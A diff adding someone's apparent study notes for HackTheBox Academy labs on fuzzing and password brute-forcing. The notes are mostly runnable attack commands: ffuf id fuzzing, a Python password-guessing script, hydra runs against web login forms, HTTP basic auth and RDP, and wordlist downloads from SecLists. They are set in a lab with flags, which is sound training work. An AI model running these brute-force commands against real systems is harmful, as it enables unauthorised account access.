@@ -30,4 +30,50 @@ The response size for any erroneous request is 768, therefore, students need to 
 ffuf -w ids.txt:FUZZ -u 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768
 curl -s 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=73' | grep 'HTB'
 
+-----------------
+import requests
 
+ip = "83.136.249.34"  # Change this to your instance IP address
+port = 38768       # Change this to your instance port number
+
+# Download a list of common passwords from the web and split it into lines
+passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()
+
+# Try each password from the list
+for password in passwords:
+    print(f"Attempted password: {password}")
+
+    # Send a POST request to the server with the password
+    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
+
+    # Check if the server responds with success and contains the 'flag'
+    if response.ok and 'flag' in response.json():
+        print(f"Correct password found: {password}")
+        print(f"Flag: {response.json()['flag']}")
+        break
+
+-----------------------
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
+Next, we need to start matching that wordlist to the password policy.
+grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
+
+
+Brute-Forcing a Web Login Form
+ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+
+hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
+-----------------------------
+Basic HTTP Authentication
+------------------------------
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
+hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
+
+After successfully brute-forcing, and then logging into the target, what is the full flag you find?
+-----------------------------
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.52.235 -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+After successfully brute-forcing, and then logging into the target, what is the full flag you find?
+------------------------------
+Medusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. Its primary objective is to support a wide array of services that allow remote authentication, enabling penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.
